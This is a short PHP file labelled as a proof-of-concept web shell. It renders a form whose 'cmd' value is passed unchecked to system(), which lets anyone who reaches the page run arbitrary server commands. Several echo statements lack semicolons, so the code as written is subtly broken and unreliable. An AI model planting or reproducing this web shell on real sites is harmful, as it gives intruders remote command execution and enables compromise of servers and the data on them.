<?php

//
// PoC: a simple webshell 
// Author: Bonghwan Choi
// modified by WBOAN
//
echo '<br>'
echo '<br>'
echo '<center>Enter a Command:<br>';
echo '<br>'
echo '<form action="">';
echo '<input type=text name="cmd">';
echo '<input type="submit">';
echo '</form>';

if (isset($_GET['cmd'])) {
	system($_GET['cmd']);
}

?>
